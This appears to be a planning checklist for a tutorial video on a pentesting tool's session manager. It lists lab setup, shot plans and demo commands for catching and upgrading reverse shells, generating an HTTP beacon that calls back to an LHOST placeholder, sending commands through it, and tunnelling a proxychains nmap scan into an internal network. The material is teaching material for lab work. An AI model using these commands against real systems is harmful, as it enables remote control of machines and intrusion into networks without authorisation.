# Video 05: Session Manager (Reverse Shells)

**Duration:** 12-15 min | **Focus:** Shell catching, upgrading, and pivoting

## Samples Needed

Place in `samples/`:

- [ ] Simple web shell or exploit for triggering reverse shell
- [ ] Beacon script templates (for reference)

## Scripts

Place in `scripts/`:

- [ ] `talking_points.md` - Section-by-section narration
- [ ] `exploit_setup.md` - How to trigger test shells
- [ ] `tunnel_scenarios.md` - Pivoting demo setup

## Lab Requirements

- [ ] Target VM for catching shells
  - [ ] Has Python3 (for upgrade demo)
  - [ ] Or has `script` command
- [ ] Simple exploit ready (web vuln, etc.)
- [ ] SSH access to pivot host (for tunnel demo)
- [ ] Internal network segment (for pivot demo)

## Key Demo Commands

```bash
# Start TCP listener
crack session start tcp --port 4444

# [Trigger exploit on target]

# List sessions
crack session list

# Upgrade to TTY
crack session upgrade <ID> --method auto

# Stabilize
crack session stabilize <ID>

# HTTP Beacon workflow
crack session start http --port 8080
crack session beacon-gen bash http://LHOST:8080 -o beacon.sh
# [Upload and execute beacon]
crack session beacon-send <ID> "whoami"
crack session beacon-poll <ID>

# Pivoting
crack session tunnel-create <ID> --type ssh-dynamic --socks-port 1080
crack session tunnel-list
proxychains4 nmap -sT 192.168.1.0/24
```

## Key Shots

1. Listener waiting for connection
2. Shell connecting (terminal output)
3. Before upgrade: janky shell, no arrows
4. After upgrade: full TTY, arrows work (split screen!)
5. Beacon send/poll cycle
6. SOCKS tunnel with proxychains scan
7. Session list with multiple entries

## Demo Scenarios

### Scenario A: Basic Shell Flow
1. Start listener
2. Trigger exploit
3. Catch shell
4. Upgrade
5. Stabilize
6. Show full TTY working

### Scenario B: HTTP Beacon (Optional)
1. Start HTTP listener
2. Generate beacon script
3. Simulate execution
4. Send commands via beacon
5. Poll for results

### Scenario C: Pivoting (Optional)
1. Existing shell on DMZ host
2. Create SOCKS tunnel
3. Scan internal network through tunnel
4. Catch internal shell

## Thumbnail Concept

Terminal showing shell upgrade transformation
Text: "Upgrade Shells"
